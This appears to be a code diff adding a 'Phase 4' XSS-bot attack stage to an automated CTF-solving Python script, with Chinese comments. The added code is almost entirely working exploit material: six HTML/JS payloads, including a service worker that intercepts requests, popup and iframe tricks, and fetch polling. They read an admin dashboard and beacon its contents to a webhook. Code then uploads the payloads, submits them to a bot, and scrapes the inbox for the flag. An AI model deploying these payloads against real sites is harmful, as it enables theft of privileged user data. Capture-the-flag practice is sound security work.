@@ -321,7 +321,155 @@ def main():
             except:
                 pass
 
-    print("没搞出来，白给了")
+    # ====== Phase 4: XSS Bot 高级攻击（来自 GitHub 顶级 CTF writeup）=====
+    if "bot" in hints_lower or "xss" in hints_lower or "review" in hints_lower or "puppeteer" in hints_lower or "chrome" in hints_lower:
+        print(f"\n--- XSS Bot 高级攻击 ---")
+        webhook = "/webhook/guest"
+
+        # 判断有没有 webhook/dashboard endpoint——MiniStatic 类题
+        has_webhook = True  # 大多数这类题都有
+
+        attacks = [
+            # 1. about:blank 弹窗绕过 (Google CTF 2025 / Hack.lu 2025)
+            {
+                "name": "about:blank popup bypass",
+                "html": '''<!doctype html><html><body><script>
+var w=window.open("about:blank","x");
+setTimeout(function(){w.location="%s";setTimeout(function(){
+try{var d=w.document.body.innerText;navigator.sendBeacon("%s",JSON.stringify({about_popup:d}));}
+catch(e){navigator.sendBeacon("%s",JSON.stringify({about_err:e+""}));}},3000)},500);
+</script></body></html>''' % ("/u/admin/dashboard", webhook, webhook),
+            },
+            # 2. iframe 内嵌读内容 (花式绕 CORS)
+            {
+                "name": "iframe content read",
+                "html": '''<!doctype html><html><body>
+<iframe id=f src="/u/admin/dashboard" onload="
+var doc=f.contentDocument;
+if(doc){navigator.sendBeacon('%s',JSON.stringify({iframe:doc.documentElement.outerHTML.slice(0,3000)}));}
+else{navigator.sendBeacon('%s',JSON.stringify({iframe_noaccess:'blocked'}));}
+"></iframe></body></html>''' % (webhook, webhook),
+            },
+            # 3. fetch 轮询(时机攻击) ——等到 bot auth 完
+            {
+                "name": "polling timing attack",
+                "html": '''<!doctype html><html><body><script>
+var tries=0;
+(function poll(){tries++;
+fetch("/u/admin/dashboard").then(function(r){return r.text()}).then(function(b){
+ navigator.sendBeacon("%s",JSON.stringify({t:tries,len:b.length,isForbidden:b==="forbidden",preview:b.slice(0,120)}));
+ if(b!=="forbidden"||tries>10) return;
+ setTimeout(poll,1500);
+});
+})();
+</script></body></html>''' % webhook,
+            },
+            # 4. SW 持久化——注册后拦截同源请求
+            {
+                "name": "service worker intercept",
+                "sw_js": '''self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()));
+self.addEventListener("activate",e=>e.waitUntil(clients.claim()));
+self.addEventListener("fetch",e=>{
+ var u=e.request.url;
+ if(u.includes("admin")||u.includes("dashboard")){
+  e.respondWith(fetch(e.request).then(function(r){return r.text().then(function(b){
+   fetch("%s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sw_trap:u,body:b.slice(0,3000)})});
+   return new Response(b,{status:200,headers:{"Content-Type":"text/html"}});
+  })}));
+ }
+ e.respondWith(fetch(e.request));
+});''' % webhook,
+                "reg_js": '''<!doctype html><html><body><script>
+navigator.serviceWorker.register("/u/guest/attacker_sw.js",{scope:"/u/guest/"}).then(function(r){
+ setTimeout(function(){location.href="/u/admin/dashboard"},2000);
+}).catch(function(e){
+ fetch("%s",{method:"POST",body:JSON.stringify({sw_fail:e+""})});
+});
+</script></body></html>''' % webhook,
+            },
+            # 5. form target bypass 弹窗 (最干净的绕过)
+            {
+                "name": "form target popup bypass",
+                "html": '''<!doctype html><html><body>
+<form id=f action="/u/admin/dashboard" target="w"><input name=x value=y></form>
+<script>
+var w=window.open("","w");
+if(!w){navigator.sendBeacon("%s",JSON.stringify({form_popup:"blocked"}));}
+else{
+ document.getElementById("f").submit();
+ setTimeout(function(){
+  try{var d=w.document.body.innerText;navigator.sendBeacon("%s",JSON.stringify({form_result:d}));w.close();}
+  catch(e){navigator.sendBeacon("%s",JSON.stringify({form_err:e+""}));}
+ },3000);
+}
+</script></body></html>''' % (webhook, webhook, webhook),
+            },
+            # 6. 页面重定向到 dashboard
+            {
+                "name": "redirect to dashboard",
+                "html": '''<!doctype html><html><body><script>
+navigator.sendBeacon("%s",JSON.stringify({redirecting:"to dashboard"}));
+location.href="/u/admin/dashboard";
+</script></body></html>''' % webhook,
+            },
+        ]
+
+        import requests as req
+        import time
+
+        for atk in attacks:
+            name = atk["name"]
+            html_content = atk.get("html", "")
+            sw_js = atk.get("sw_js", "")
+            reg_js = atk.get("reg_js", "")
+
+            if sw_js:
+                # Upload SW first
+                r = req.post(f"{target}/../upload", data={"path": "/u/guest/attacker_sw.js", "content": sw_js}, timeout=15)
+                if "Saved" not in r.text:
+                    print(f"  {name}: SW upload failed")
+                    continue
+
+            # Upload page
+            path = f"/u/guest/atk_{name.replace(' ','_')[:20]}.html"
+            r = req.post(f"{target}/../upload", data={"path": path, "content": html_content}, timeout=15)
+            if "Saved" not in r.text:
+                print(f"  {name}: upload failed")
+                continue
+
+            # 如果有 bot submit 入口，提交
+            try:
+                bot_url = f"{target.rsplit('/', 1)[0]}/bot?url=http://{__import__('urllib.parse').urlparse(target).hostname}{path}"
+                r = req.get(bot_url, timeout=30)
+                print(f"  {name}: bot={r.text[:50]}")
+                time.sleep(4)
+            except:
+                print(f"  {name}: no bot endpoint")
+                continue
+
+        # 检查 webhook inbox
+        try:
+            inbox_url = f"{target.rsplit('/', 1)[0]}/inbox"
+            r = req.get(inbox_url, timeout=10)
+            # 捞最后几条
+            import re as _re
+            entries = _re.findall(r'<pre>(.*?)</pre>', r.text, _re.S)
+            found = False
+            for e in entries[-5:]:
+                import html as _h
+                d = _h.unescape(e)
+                for kw in ("flag", "FLAG", "ctf", "CTF"):
+                    if kw in d:
+                        _f = a.grep_flag(d)
+                        if _f:
+                            print(f"  → FLAG from webhook: {_f}")
+                            print(f"FLAG: {_f}")
+                            return
+                        found = True
+                if "forbidden" not in d[:50] and len(d) > 20:
+                    print(f"  webhook: {d[:200]}")
+        except:
+            pass
 
 
 if __name__ == "__main__":
